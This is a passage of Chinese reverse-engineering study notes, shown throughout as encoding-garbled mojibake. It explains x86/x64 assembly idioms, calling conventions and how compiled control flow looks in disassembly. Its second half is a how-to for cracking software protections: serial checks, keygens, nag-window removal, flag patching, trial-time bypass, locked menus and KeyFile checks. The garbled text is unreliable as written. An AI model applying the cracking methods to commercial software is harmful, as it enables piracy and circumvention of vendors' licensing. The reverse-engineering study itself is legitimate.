+ä½ç§»é‡\nè½¬ç§»æŒ‡ä»¤å¯ä»¥åˆ†ä¸ºçŸ­è½¬ç§»ï¼Œé•¿è½¬ç§»å’Œå­ç¨‹åºè°ƒç”¨ï¼ˆcallï¼‰\nçŸ­è½¬ç§»2å­—èŠ‚\né•¿è½¬ç§»æ— æ¡ä»¶5å­—èŠ‚ï¼Œæ¡ä»¶è½¬ç§»6å­—èŠ‚\ncallæŒ‡ä»¤5å­—èŠ‚\næ¡ä»¶è®¾ç½®æŒ‡ä»¤ å¯¹äºè¯­å¥\nc = (a \u0026lt; b) ? c1 : c2; æ¡ä»¶åˆ†æ”¯è¯­å¥ä¸º\ncmp a, b mov eax, c1 jl L1 mov eax, c2L1: ä½¿ç”¨æ¡ä»¶è®¾ç½®è¯­å¥å¯ä»¥ä¸åŒ…å«æ¡ä»¶åˆ†æ”¯\nxor eax, eaxcmp a, bsetge al ; if a \u0026gt;= b, al = 1, else al = 0dec eaxand eax, (c1 - c2)add eax, c2 æˆ–è€…ä½¿ç”¨æ¡ä»¶ä¼ è¾“æŒ‡ä»¤\nmov eax, c2cmp a, bcmovl eax, cl å¾ªç¯è¯­å¥ é€šå¸¸ä½¿ç”¨ ecx å¯„å­˜å™¨ä½œä¸ºè®¡æ•°å™¨ï¼Œä¾‹å¦‚\nxor ecx, ecx ; è®¡æ•°å™¨æ¸…ç©º:L1\tinc ecx\t...\tcmp ecx, 05 ; å¾ªç¯é€€å‡ºæ¡ä»¶\tjbe L1 ä¼˜åŒ–åçš„å¾ªç¯å®ä¾‹\nxor ecx, ecx xor eax, eax:L1 add ecx, eax inc eax cmp eax, 64h jle L1 xor eax, eax å¯¹åº”çš„æºç \nsum = 0;for (i = 0; i \u0026lt;= 100; i++) sum += i; æ•°å­¦è¿ç®— åŠ å‡æ³• add å’Œ sub æŒ‡ä»¤ï¼Œæœ‰æ—¶å€™å¯ä»¥ä½¿ç”¨ lea è¿›è¡Œä¼˜åŒ–\nlea å…è®¸ä¸€ä¸ªæ—¶é’Ÿå†…è®¡ç®— lea edx, [eax+ecx+78h] çº§åˆ«çš„è¿ç®—\nä¹˜æ³• ä¹˜æ³•ä½¿ç”¨ mul æˆ– imul æŒ‡ä»¤\nå¯¹äº2çš„å¹‚ï¼Œä½¿ç”¨ shl æŒ‡ä»¤å¯ä»¥åŠ å¿«è¿ç®—\nç”±äº lea æŒ‡ä»¤å¯ä»¥å®ç°ä¹˜ 2, 4, 8 çš„è¿ç®—ï¼Œå› æ­¤å¯ä»¥ç”¨æ¥åŠ å¿« 3, 5, 6, 7, 9 ç­‰æ•°å­—çš„ä¹˜æ³•è¿ç®—ï¼Œå¦‚ lea eax, [eax+eax*4]\né™¤æ³• div æˆ– idiv æŒ‡ä»¤\nå¯¹äº2çš„å¹‚ï¼Œä½¿ç”¨ shr æŒ‡ä»¤åŠ é€Ÿï¼Œæœ‰ç¬¦å·æ—¶ä½¿ç”¨ sar\næ­¤å¤–å¯ä»¥åˆ©ç”¨ä¹˜æ³•è¿›è¡ŒåŠ é€Ÿ\nå¸¸è§çš„ä¼˜åŒ–å…¬å¼ä¸º $$ \\dfrac{a}{b}=a\\times \\dfrac{1}{b} $$ å› æ­¤ï¼Œ$\\div 11$ å¯ä»¥ä¼˜åŒ–ä¸º $(\\times 2E8BA2E9)\u0026raquo;(32+1)$\nmov eax, 2E8BA2E9imul ecxsar edx, 1 ; edxä¸­å­˜æ”¾äº†ä¹˜æ³•çš„é«˜ä½åŒå­—èŠ‚mov ecx, edx å­—ç¬¦ä¸² å­—ç¬¦ä¸²å­˜å‚¨ åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§ä½¿ç”¨ç»“æŸç¬¦ä½œä¸ºæ ‡è¯†ï¼Œä¸€ç§è®°å½•é•¿åº¦\nCè¯­è¨€ï¼šString\\0 DOSå­—ç¬¦ä¸²ï¼šString$ PASCALï¼š\\x05String Delphiï¼š\\x05\\x00String Goè¯­è¨€ä½¿ç”¨ä¸€ä¸ª64ä½æ•´å‹è®°å½•é•¿åº¦\nå­—ç¬¦å¯»å€æŒ‡ä»¤ movå°†å½“å‰æŒ‡ä»¤æ‰€åœ¨çš„å†…å­˜å¤åˆ¶å¹¶æ”¾åˆ°ç›®çš„å¯„å­˜å™¨ä¸­ï¼Œå¯æ“ä½œå¸¸é‡æˆ–æŒ‡é’ˆ\nleaæ˜¯è£…å…¥æœ‰æ•ˆåœ°å€ï¼Œæ“ä½œæ•°æ˜¯åœ°å€\nä»¥ä¸‹ä¸¤æ¡æŒ‡ä»¤æ˜¯ç­‰ä»·çš„\nlea eax, [401000h]mov eax, 401000h éƒ½æ˜¯å°†401000hå†™å…¥eaxå¯„å­˜å™¨ä¸­\nå› æ­¤ï¼Œä»¥ä¸‹ä¸¤ä¸ªæŒ‡ä»¤ä¹Ÿæ˜¯ç­‰ä»·çš„\nlea eax, [eax+8]add eax, 8 å¸¸è¢«ç¼–è¯‘å™¨ç”¨æ¥è®¡ç®—åŠ æ³•\nASCIIå¤§å°å†™è½¬æ¢ åŒºåˆ«åœ¨äºäºŒè¿›åˆ¶çš„ç¬¬äº”ä½ï¼Œå¤§å†™å­—æ¯ä¸º0ï¼Œå°å†™å­—æ¯ä¸º1\nå› æ­¤æœ‰å¦‚ä¸‹æ–¹æ³•\nå¤§å°å†™è½¬æ¢ï¼š$\\pm\\ \\mathrm{0x}20$ï¼Œ$\\oplus\\ \\mathrm{0x}20$ è½¬å¤§å†™ï¼š$\u0026amp;\\ \\mathrm{0b}11011111$ è½¬å°å†™ï¼š$|\\ \\mathrm{0b}00100000$ è®¡ç®—é•¿åº¦ mov ecx, FFFFFFFF ; è¿™ä¸€å¥æ˜¯ä¸€ä¸ªé‡è¦ç‰¹å¾xor eax, eax ; æ¸…é›¶ï¼ŒåŸæ–‡ä¸ºsubrepnz ; å¤åˆ¶ä¸²æ“ä½œï¼Œç›´åˆ°ecxä¸º0scasb ; ä¸²æ‰«ææŒ‡ä»¤ï¼ŒæŠŠalä¸­çš„å†…å®¹ä¸ediæŒ‡å‘çš„é™„åŠ æ®µä¸­çš„æ•°æ®é€ä¸€æ¯”è¾ƒnot ecx ; ecx=å­—ç¬¦é•¿åº¦+1dec ecx ; ecx=å­—ç¬¦é•¿åº¦je xxxxxx ; å¦‚æœecxä¸º0ï¼Œè¯´æ˜é•¿åº¦ä¸º0 æŒ‡ä»¤ä¿®æ”¹æŠ€å·§ eaxæœ‰ä¼˜åŒ–ï¼Œå°½å¯èƒ½ä½¿ç”¨\næ›¿æ¢å­—èŠ‚ï¼š\næŒ‡ä»¤ æœºå™¨ç  æŒ‡ä»¤å­—èŠ‚é•¿åº¦ nop 90 1 push eax + pop eax 50 58 2 inc eax + dec eax 40 48 2 mov edi, edi 8B FF 2 jmp xx EB 00 2 ç”¨nopå°±è¡Œ\nå¯„å­˜å™¨æ¸…é›¶ï¼š\næŒ‡ä»¤ æœºå™¨ç  æŒ‡ä»¤å­—èŠ‚é•¿åº¦ mov eax, 00000000h B8 00 00 00 00 5 push 0 + pop eax 6A 00 + 58 3 sub eax, eax 2B C0 2 xor eax, eax 33 C0 2 æµ‹è¯•å¯„å­˜å™¨æ˜¯å¦ä¸º0ï¼š\næŒ‡ä»¤ æœºå™¨ç  æŒ‡ä»¤å­—èŠ‚é•¿åº¦ cmp eax, 00000000h 83 F8 00 3 or eax, eax / test eax, eax 0B C0 / 85 C0 2 åæ¥ je label å­—èŠ‚ç ä¸º 74 xx æˆ– 0F 84 xxxxxxxxï¼Œé•¿åº¦ä¸º2æˆ–6ï¼Œå–å†³äºè¿‘è·³è½¬è¿˜æ˜¯è¿œè·³è½¬\nå¯„å­˜å™¨ç½® 0FFFFFFFFh\næŒ‡ä»¤ æœºå™¨ç  æŒ‡ä»¤å­—èŠ‚é•¿åº¦ mov eax, 0FFFFFFFFh B8 FF FF FF FF 5 ï¼ˆæ¸…é›¶åï¼‰dec eax 48 1 std + sbb eax, eax F9 + 2B C0 3 è½¬ç§»æŒ‡ä»¤\næŒ‡ä»¤ æœºå™¨ç  æŒ‡ä»¤å­—èŠ‚é•¿åº¦ jmp label EB xx / E9 xxxxxxxx 2 / 6 push label + ret 68 xxxxxxxx + C3 6 64ä½ ä¸32ä½æœ‰å¾ˆå¤šé‡å \nå¯„å­˜å™¨ 64ä½é€šç”¨å¯„å­˜å™¨ R å¼€å¤´\n8ä¸ª128ä½ XMM å¯„å­˜å™¨ï¼Œé€šå¸¸ç”¨æ¥ä¼˜åŒ–ï¼ˆSIMDæŒ‡ä»¤ï¼‰\næ­¤å¤–ï¼Œ AX ä½16ä½ï¼ŒAL ä½8ä½ï¼Œ AH ç¬¬ $8\\sim 15$ ä½\nR8 åˆ™æœ‰ R8D ä½32ä½ï¼ŒR8W ä½16ä½ï¼ŒR8B ä½8ä½\nå‡½æ•° æ ˆ x64ä¸­æœ‰å¦‚ä¸‹åŒºåˆ«\nä¸€ä¸ªæ ˆç©ºé—´8å­—èŠ‚ï¼ˆ64ä½ï¼‰\næ±‡ç¼–æŒ‡ä»¤å¯¹æ ˆé¡¶éœ€è¦å¯¹é½16ï¼ˆè¢«16æ•´é™¤ï¼‰\næ ¹æ®startå¯»æ‰¾main startå‡½æ•°ç»“æŸå‰ä¼šæœ‰å¦‚ä¸‹æŒ‡ä»¤\njmp __tmainCRTStartup è¿›å…¥è¯¥å‡½æ•°åå¯ä»¥çœ‹åˆ° main å‡½æ•°\nå¦‚æœç¬¦å·è¡¨è¢«å»é™¤ï¼Œå¯æ ¹æ®å‰åç‰¹å¾è¿›è¡Œå®šä½\nåœ¨è°ƒç”¨å®Œæˆmainåï¼Œé€šå¸¸ä¼šè°ƒç”¨exitæ¥é€€å‡ºè¿›ç¨‹ï¼Œæ‰€ä»¥exitå‰çš„ä¸€ä¸ªcallå°±æ˜¯mainå‡½æ•°ï¼ˆä¹Ÿå¯èƒ½åœ¨è¯¥å‡½æ•°å†…éƒ¨çš„callä¸­ï¼‰ã€‚\nè°ƒç”¨çº¦å®š ä½¿ç”¨å¯„å­˜å™¨å¿«é€Ÿè°ƒç”¨çº¦å®š\nå‰å‡ ä¸ªå‚æ•°ä½¿ç”¨çš„å¯„å­˜å™¨æ˜¯å›ºå®šçš„ï¼Œåç»­çš„å‚æ•°ä»å³å¾€å·¦æ ˆï¼Œé1, 2, 4, 8å­—èŠ‚å¤§å°çš„å‚æ•°å¿…é¡»ç”¨å¼•ç”¨ï¼ˆåœ°å€ï¼‰ä¼ å‚\nä¼ é€’é¡ºåºä¸º RCXï¼Œ RDXï¼Œ R8ï¼Œ R9ï¼Œæ‰€æœ‰æµ®ç‚¹å‚æ•°ç”±XMMä¼ å‚ï¼Œé¡ºåºä¾æ¬¡ä¸º XMM0 ~ XMM3\nä¸ºäº†ä½¿å¾—å¯„å­˜å™¨ä»ç„¶èƒ½å¤Ÿä½¿ç”¨ï¼Œä¼šé¢„ç•™æ ˆç©ºé—´ï¼Œå°†å¯„å­˜å™¨çš„å€¼å­˜å…¥æ ˆç©ºé—´ä¸­ï¼Œè¯¥ç©ºé—´ç”±è°ƒç”¨è€…ç”³è¯·å¹¶å¹³è¡¡\nå‡½æ•°è¿”å›å€¼ ä½¿ç”¨ RAX è¿”å›å‚æ•°ï¼Œè¿”å›å€¼è¿‡å¤§å¯ä»¥ä½¿ç”¨æ ˆç©ºé—´ä½œä¸ºå‚æ•°é—´æ¥è®¿é—®\næ•°æ®ç»“æ„ å±€éƒ¨å˜é‡ ä½¿ç”¨æ ˆåŒºè¿›è¡Œå­˜æ”¾\nReleaseç‰ˆä¼šæ›´å¤šåœ°ä½¿ç”¨å¯„å­˜å™¨\nå…¨å±€å˜é‡ åœ°å€é€šå¸¸åœ¨ç¼–è¯‘æœŸå›ºå®š\nmov eax, cs:140009150h æ•°ç»„ $åœ°å€=é¦–åœ°å€+ç±»å‹å¤§å°\\times ä¸‹æ ‡$\nIDAä¸­ä½¿ç”¨Yå¿«æ·é”®æ¥ä¿®æ”¹æ•°æ®ç±»å‹ï¼Œå¯ä»¥åç¼–è¯‘æˆä¸‹æ ‡æ¨¡å¼ï¼Œæ›´å¥½çœ‹ä¸€äº›\næ±‡ç¼–é€šå¸¸ä¸º [åœ°å€+å¯„å­˜å™¨*n]ï¼ˆæˆ–è€…å¾ªç¯ä¸­æ¯æ¬¡å¾ªç¯ åœ°å€+=nï¼Ÿï¼‰\næ§åˆ¶è¯­å¥ é€šå¸¸è™šçº¿ç®­å¤´è¡¨ç¤ºæœ‰æ¡ä»¶è·³è½¬ï¼Œå®çº¿ç®­å¤´è¡¨ç¤ºæ— æ¡ä»¶è·³è½¬\nif è¯­å¥ï¼šjxxè·³è½¬ï¼Œä¸”ç›®çš„åœ°å€åæ²¡æœ‰jxxï¼ˆè¯´æ˜ä¸æ˜¯å¾ªç¯ï¼‰\nif elseè¯­å¥ï¼šjxxè·³è½¬ï¼Œä¸”ç›®çš„åœ°ä¹‹å‰æœ‰ä¸€ä¸ªjmpå®è·³è½¬ï¼Œç›®çš„åœ°å€åæ— è·³è½¬\nif elif elseè¯­å¥ï¼šå¤šä¸ªjxxè·³è½¬ï¼Œæ¯ä¸ªBlockä»¥jmpç»“å°¾ï¼Œæœ€åä¸€ä¸ªBlockä¸å«è·³è½¬\nswitch caseè¯­å¥ï¼šåˆ†æ”¯æ•° $\\geqslant 6$ ä½¿ç”¨caseè¡¨ï¼Œ$\u0026lt;6$ ä½¿ç”¨else if\næ— æ³•ä½¿ç”¨caseè¡¨çš„æƒ…å†µä¸‹ï¼Œä¸ºå‡å°‘ifçš„åˆ¤æ–­æ¬¡æ•°ï¼Œå¯èƒ½ä½¿ç”¨äºŒå‰å¹³è¡¡æ ‘æ¥å‡å°‘ifåˆ¤æ–­æ¬¡æ•°\nå¾ªç¯è¯­å¥ do while å…ˆæ‰§è¡Œï¼Œååˆ¤æ–­\ndo_while_start:{\t; ä»£ç }cmp a, bjxx do_while_start é€šå¸¸æœ‰ä¸€ä¸ªå‘ä¸Šè·³è½¬\nwhileå¾ªç¯ å…ˆåˆ¤æ–­ï¼Œåæ‰§è¡Œ\nwhile_start:cmp a, bjxx while_end{\t; ä»£ç }jmp while_startwhile_end:; åç»­ä»£ç  é€šå¸¸ä¸ºä¸€ä¸ªå‘ä¸‹çš„æ¡ä»¶è·³è½¬ï¼Œè¯¥ç›®çš„åœ°ä¹‹å‰æœ‰ä¸€ä¸ªå‘ä¸Šçš„å®è·³è½¬ï¼Œè·³è½¬åˆ°å‘ä¸‹è·³è½¬å‰\nfor å¾ªç¯ jmp for_iffor_step: æ­¥é•¿for_if: å¾ªç¯æ¡ä»¶jxx for_endfor ä»£ç jmp for_stepfor_end: å¾ˆå¸¸è§çš„ä»£ç ï¼Œæ¯”whileå¾ªç¯å¤šä¸€ä¸ªå‘ä¸‹è·³è½¬\næ•°å­¦è¿ç®—ç¬¦ åŠ å‡æ³• addå’ŒsubæŒ‡ä»¤ï¼Œå¯ç”¨leaæŒ‡ä»¤è¿›è¡Œä¼˜åŒ–\næ­¤å¤–è¿˜æœ‰å¸¸é‡æŠ˜å çš„ä¼˜åŒ–æ–¹æ³•ï¼Œå³ç¼–è¯‘æ—¶æå‰å®Œæˆå¸¸é‡é—´çš„è®¡ç®—ï¼ŒèŠ‚çœè¿è¡Œæ¶ˆè€—çš„æ—¶é—´\nä¹˜æ³• imulä¸ºæœ‰ç¬¦å·ä¹˜æ³•ï¼Œmulä¸ºæ— ç¬¦å·ä¹˜æ³•\né€šå¸¸ä½¿ç”¨leaæ¯”ä¾‹å› å­å¯»å€ä¼˜åŒ–\nlea edx, ds:0[rcx*4] ; *4imul edx, 7 ; *7lea edx, [rbc+rbc*8] ; *9 é™¤æ³• æœ‰ç¬¦å· é™¤æ•°ä¸º $2^n$ æ—¶ï¼Œä½¿ç”¨ä½ç§»è¿›è¡Œä¼˜åŒ–\né™¤æ•°ä¸º $-2^n$ æ—¶ï¼Œä½¿ç”¨ä½ç§»ï¼ŒåŒæ—¶å¢åŠ æ±‚è¡¥ï¼ˆxä¸ºè´Ÿæ•°æ—¶ï¼Œè®¡ç®— $-((x+(2^n-1))\\gg n)$ ï¼‰\nå–æ¨¡ è½¯ä»¶ä¿æŠ¤æŠ€æœ¯ åºåˆ—å· åºåˆ—å·ï¼ˆæ³¨å†Œç ï¼‰çš„æ–¹å¼æ˜¯ç›®å‰æœ€å¸¸è§çš„ä¸€ç§ä¿æŠ¤\nè¿‡ç¨‹é€šå¸¸ä¸ºï¼šç”¨æˆ·æäº¤ä¸ªäººä¿¡æ¯ï¼Œå…¬å¸è®¡ç®—å¾—åˆ°åºåˆ—å·å¹¶è¿”å›ç»™ç”¨æˆ·ï¼Œç”¨æˆ·é€šè¿‡åºåˆ—å·è¿›è¡Œæ³¨å†Œã€‚è½¯ä»¶ä»ç£ç›˜æ–‡ä»¶æˆ–æ³¨å†Œè¡¨ä¸­è·å–æ³¨å†Œä¿¡æ¯\nä¿æŠ¤æœºåˆ¶ æœ¬åœ°è®¡ç®—ç”¨æˆ·ä¿¡æ¯å¹¶ä¸åºåˆ—å·æ¯”è¾ƒ å³ï¼š$åºåˆ—å·=F(ç”¨æˆ·å)$\nå¯¹äºè¿™ç§æ–¹å¼ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨è°ƒè¯•çš„æ‰‹æ®µï¼Œåœ¨å†…å­˜ä¸­ç›´æ¥æ‰¾åˆ°è®¡ç®—åçš„åºåˆ—å·ï¼ŒåŒæ—¶ï¼Œå°†Få‡½æ•°å¤åˆ¶å‡ºå³å¯ç”Ÿæˆæ³¨å†Œæœº\né€šè¿‡æ³¨å†Œç æ±‚é€†å¹¶ä¸ç”¨æˆ·ä¿¡æ¯æ¯”è¾ƒ å³ï¼šç”¨å…¬å¼ $åºåˆ—å·=F(ç”¨æˆ·å)$ ç”Ÿæˆï¼Œç”¨å…¬å¼ $ç”¨æˆ·å=F^{-1}(åºåˆ—å·)$ éªŒè¯\nç ´è§£æ–¹æ³•æœ‰\né€šè¿‡ $F^{-1}$ æ±‚å‡º $F$ ç»™å®šç”¨æˆ·åï¼Œç©·ä¸¾åºåˆ—å· ç»™å®šåºåˆ—å·ï¼Œç”¨ $F^{-1}$ è®¡ç®—å‡ºç”¨æˆ·åï¼ˆé€šå¸¸åŒ…å«ä¸å¯è§å­—ç¬¦ï¼‰ å¯¹ç­‰å‡½æ•°æ£€æŸ¥ å³ï¼š$F_1(ç”¨æˆ·å)=F_2(åºåˆ—å·)$\né€šå¸¸ $F_2$ å¯é€†ï¼Œå€Ÿé‰´ä¸Šä¸¤ç§ç ´è§£æ€è·¯å³å¯\näºŒå…ƒå‡½æ•° å³ï¼š$ç‰¹å®šå€¼=F(ç”¨æˆ·åï¼Œåºåˆ—å·)$\nç¼ºé™·åœ¨äºå¯èƒ½ç¼ºå°‘ç”¨æˆ·åä¸åºåˆ—å·çš„ä¸€ä¸€å¯¹åº”å…³ç³»ï¼Œå¼€å‘è€…ä¸æ˜“å†™å‡ºæ³¨å†Œæœº\næ”»å‡»æ–¹æ³• æ³•ä¸€ï¼šé€šè¿‡è·Ÿè¸ªè¾“å…¥ï¼Œæ‰¾åˆ°åˆ¤æ–­é€»è¾‘\nè½¯ä»¶é€šå¸¸è°ƒç”¨apiå°†ç”¨æˆ·è¾“å…¥å¤åˆ¶åˆ°ç¼“å†²åŒºï¼Œå¸¸ç”¨apiæœ‰ï¼šGetWindowsTextA(W)ï¼ŒGetDiaItemTextA(W)ï¼ŒGetDlgItemIntï¼Œhmemcpyï¼Œæˆ–è€…æŸ¥æ‰¾è¾“å‡ºå‡½æ•°ï¼ˆå¯¹è¯æ¡†æˆ–æ ‡å‡†è¾“å‡ºç­‰ï¼‰\næ³•äºŒï¼šè·Ÿè¸ªç¨‹åºå¯åŠ¨æ—¶å¯¹æ³¨å†Œç çš„åˆ¤æ–­è¿‡ç¨‹\næ³¨å†Œè¡¨ä¸­çš„åºåˆ—å·ä¼šè°ƒç”¨ RegQueryValueExA(W)ï¼ŒINIæ–‡ä»¶ä¸­ GetPrivateProfileStringA(W)ç­‰ç­‰\næ ¹æ®æ•°æ®çº¦æŸæ€§ å¯¹äºé‡‡ç”¨æ˜æ–‡æ¯”è¾ƒçš„ç¨‹åºï¼Œæ­£ç¡®æ³¨å†Œç é€šå¸¸åœ¨è¾“å…¥æ³¨å†Œç çš„å‰å 90h å­—èŠ‚çš„åœ°æ–¹\nhmemcpy è¿™ä¸ªå‡½æ•°æ˜¯ Windows 9x ç³»ç»Ÿçš„å†…éƒ¨å‡½æ•°ï¼Œæ˜¯ä¸‡èƒ½æ–­ç‚¹\nç°åœ¨åŒæ ·å¯ä»¥ä½¿ç”¨ç³»ç»Ÿçš„APIä¸‹æ–­ç‚¹\næ¶ˆæ¯æ–­ç‚¹ æŒ‰ä¸‹å’Œé‡Šæ”¾é¼ æ ‡æ—¶ï¼Œä¼šå‘é€ WM_LBUTTONDOWN (0201h) å’Œ WM_LBUTTONUP (0202h) æ¶ˆæ¯\nå¯ä»¥åˆ©ç”¨æ¶ˆæ¯æ–­ç‚¹æ–­åœ¨æŒ‰é’®çš„äº‹ä»¶ä»£ç å¤„\näººæœºäº¤äº’ä¿¡æ¯ è½¯ä»¶å¤§å¤šæ•°é‡‡ç”¨äº†äººæœºå¯¹è¯çš„æ–¹å¼è¿›è¡Œï¼Œå› æ­¤å¯ä»¥ç›´æ¥é€šè¿‡æœç´¢å­—ç¬¦ä¸²å’Œäº¤å‰å¼•ç”¨æ‰¾åˆ°å…³é”®å‡½æ•°\nåº”è¯¥æ˜¯ç›®å‰æœ€å¸¸ç”¨çš„æ–¹æ³•äº†\nå­—ç¬¦ä¸²æ¯”è¾ƒ å¯„å­˜å™¨ç›´æ¥æ¯”è¾ƒ å‡½æ•°æ¯”è¾ƒ ä¸²æ¯”è¾ƒ ä¸²æ¯”è¾ƒæœ‰äº›å°‘è§ï¼Œè®°å½•ä¸€ä¸‹ï¼š\nlea edi [] lea esi [] repz cmpsd jz (jnz) åˆ¶ä½œæ³¨å†Œæœº æ˜ç æ³„éœ²çš„æ”»å‡» åºåˆ—å·åœ¨å†…å­˜ä¸­æ›¾ä»¥æ˜ç å‡ºç°è¿‡å³å¯\nå¯ä»¥ä½¿ç”¨keymakeç¼–å†™å†…å­˜æ³¨å†Œæœºï¼Œæˆ–åˆ©ç”¨ Int 3 ç­‰ Debug API æ‰‹å†™å†…å­˜æ³¨å†Œæœº\næ— æ˜ç  è¿›è¡ŒåŠ å¯†ç®—æ³•çš„é€†å‘è§£å¯†\næˆ–è€…ç›´æ¥å°†æ±‡ç¼–åµŒå…¥æ³¨å†Œæœºä¸­\nè­¦å‘Šçª—å£ è½¯ä»¶ä¸æ—¶æé†’ç”¨æˆ·è´­ä¹°æ­£å¼ç‰ˆæœ¬\nå¯ä»¥é€šè¿‡è®¾ç½®çª—å£ä¸ºä¸å¯è§æ¥å»é™¤ï¼Œæˆ–è€…åœ¨çª—å£çš„åˆ›å»ºå‡½æ•°å¤„å°†å…¶è·³è¿‡\nåˆ©ç”¨ Resource Hacker è½¯ä»¶å¯ä»¥æ‰¾åˆ°çª—å£çš„ idï¼Œç„¶åå†æ±‡ç¼–ä¸­æœç´¢å³å¯æ‰¾åˆ°çª—å£çš„ç¨‹åº\nç¨‹åºä¸­ï¼Œæ˜¯å¦æ³¨å†Œçš„ flag æ ‡è®°å¯èƒ½æ˜¯å…¨å±€å˜é‡ï¼Œæ‰¾åˆ°è¿™ä¸ªå˜é‡å¹¶ patch ç¨‹åºä½¿å…¶ä¸º 1 å³å¯\næ—¶é—´é™åˆ¶ é™åˆ¶å•æ¬¡è¿è¡Œæ—¶é•¿ï¼Œæˆ–è€…é™åˆ¶è½¯ä»¶çš„ä½¿ç”¨æ—¶é—´\nè®¡æ—¶å™¨ setTimer() å‡½æ•° ç¨‹åºè¿è¡Œæ—¶ä¼šç”³è¯·ä¸€ä¸ªè®¡æ—¶å™¨ï¼Œå¹¶æŒ‡å®šé—´éš”ï¼Œå¹¶è·å¾—ä¸€ä¸ªå¤„ç†è®¡æ—¶å™¨è¶…æ—¶çš„å›è°ƒå‡½æ•°\nUINT SetTimer( HWND hWnd, // çª—å£å¥æŸ„ï¼Œè®¡æ—¶å™¨åˆ°æ—¶åï¼Œå°†å‘è¿™ä¸ªçª—å£å‘é€WM_TIMERæ¶ˆæ¯ UINT nIDEvent, // è®¡æ—¶å™¨æ ‡è¯† UINT uElapse, // æŒ‡å®šè®¡æ—¶å™¨æ—¶é—´é—´éš”ï¼ˆå•ä½ä¸ºæ¯«ç§’ï¼‰ TIMERPROC lpTimerFunc // å›è°ƒå‡½æ•°ï¼Œè¶…æ—¶åå°†è°ƒç”¨ ); é«˜ç²¾åº¦è®¡æ—¶å™¨ é€šè¿‡è°ƒç”¨ timeSecEvent() å‡½æ•°å¯åŠ¨\nGetTickCount() å‡½æ•°åŠ timeGetTime() å‡½æ•° è¯¥å‡½æ•°è¿”å›ç³»ç»Ÿè‡ªæˆåŠŸå¯åŠ¨ä»¥æ¥æ‰€ç»è¿‡çš„æ—¶é—´ï¼Œå°†ä¸¤æ¬¡è¿”å›å€¼ç›¸å‡ï¼Œå³å¯å¾—åˆ°å½“å‰è¿è¡Œæ—¶é—´\nè¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥ä½¿ç”¨ time() ç­‰å‡½æ•°\næ—¶é—´é™åˆ¶ è½¯ä»¶é€šå¸¸å°†ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶çš„ç³»ç»Ÿæ—¶é—´ï¼Œå­˜æ”¾åœ¨æ³¨å†Œè¡¨æˆ–æ–‡ä»¶æˆ–æŸæ‰‡åŒºä¸­ï¼Œæ¯æ¬¡è¿è¡Œæ—¶è·å–è¯¥æ—¶é—´ï¼Œå¹¶ä¸å½“å‰æ—¶é—´è¿›è¡Œæ¯”è¾ƒ\nä¸ºäº†é¿å…ç”¨æˆ·ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ï¼Œè½¯ä»¶ä¼šåœ¨ä¿å­˜å®‰è£…æ—¶é—´ï¼ˆå¹¶å­˜æ”¾äºå¤šä¸ªåœ°æ–¹ï¼‰ä¹‹å¤–ï¼Œå†ä¿å­˜æœ€è¿‘ä¸€æ¬¡è¿è¡Œçš„æ—¶é—´ï¼Œæ¯æ¬¡è¿è¡Œæ—¶ç”¨å½“å‰æ—¶é—´æ›¿æ¢\næ‹†è§£æ—¶é—´é™åˆ¶ ç›´æ¥è·³è¿‡ SetTimer() å‡½æ•° åˆ©ç”¨ WM_TIMER æ¶ˆæ¯ï¼ŒæŸ¥æ‰¾åˆ°æ—¶é—´æ¯”è¾ƒçš„ä½ç½®ï¼Œå¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œpatchï¼ˆå»æ‰é€€å‡ºè·³è½¬ç­‰ç­‰ï¼‰ åŠ¨æ€åˆ†ææ—¶ï¼Œå¯ä»¥é…åˆå˜é€Ÿé½¿è½®ä½¿ç”¨ï¼Œè¿™æ ·å°±å¯ä»¥å¾ˆå¿«åˆ°è¾¾è½¯ä»¶çš„é™åˆ¶æ—¶é—´ï¼Œè¿›è¡Œè°ƒè¯•\nèœå•åŠŸèƒ½é™åˆ¶ å½“æ³¨å†Œç‰ˆå’Œæ­£å¼ç‰ˆæ–‡ä»¶ç›¸åŒï¼Œåªæ˜¯éƒ¨åˆ†åŠŸèƒ½è¢«é™åˆ¶æ— æ³•ä½¿ç”¨æ—¶ï¼Œå¯ä»¥æ¢å¤æ­£å¼ç‰ˆçš„åŠŸèƒ½\nç›¸å…³å‡½æ•° EnableMenuItem() BOOL EnableMenuItem( HMENU hMenu, // èœå•å¥æŸ„ UINT uIDEnableItem, // æ¬²å…è®¸æˆ–ç¦æ­¢çš„ä¸€ä¸ªèœå•æ¡ç›®çš„æ ‡è¯†ç¬¦ UINT uEnable, // æ§åˆ¶æ ‡å¿—ï¼ŒåŒ…æ‹¬å…è®¸ã€ç°åŒ–ã€ç¦æ­¢ç­‰ ) EnableWindow() BOOL EnableWindow( HWND hWnd, // çª—å£å¥æŸ„ BOOL bEnable // Trueä¸ºå…è®¸ï¼ŒFalseä¸ºç¦æ­¢ ) æ‹†è§£èœå•é™åˆ¶ä¿æŠ¤ æ‰¾åˆ°å…³é”®å‡½æ•°ï¼ŒæŠŠå‡½æ•°çš„å‚æ•°patchä¸€ä¸‹å³å¯\nKeyFileä¿æŠ¤ KeyFileé€šå¸¸æ˜¯ä¸€ä¸ªå°æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯å¯è§å­—ç¬¦ï¼Œä¹Ÿå¯èƒ½æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”±è½¯ä»¶å¼€å‘è€…å®šä¹‰\nè½¯ä»¶å¯åŠ¨åï¼Œä¼šä»KeyFileæ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼Œæ ¹æ®å¤„ç†ç»“æœåˆ¤æ–­æ˜¯å¦æ­£ç¡®æ³¨å†Œ\nç›¸å…³API ä¸æ–‡ä»¶æ“ä½œæœ‰å…³çš„APIéƒ½å¯ä»¥ä¸‹æ–­ç‚¹\nAPI ä½œç”¨ FindFirstFileA ç¡®å®šæ³¨å†Œæ–‡ä»¶æ˜¯å¦å­˜åœ¨ CreateFileA, _lopen ç¡®å®šæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œæ‰“å¼€æ–‡ä»¶ä»¥è·å¾—å¥æŸ„ GetFileSize, GetFileSizeEx è·å¾—æ–‡ä»¶çš„å¤§å° GetFileAttributesA, GetFileAttributesExA è·å¾—æ–‡ä»¶çš„å±æ€§ 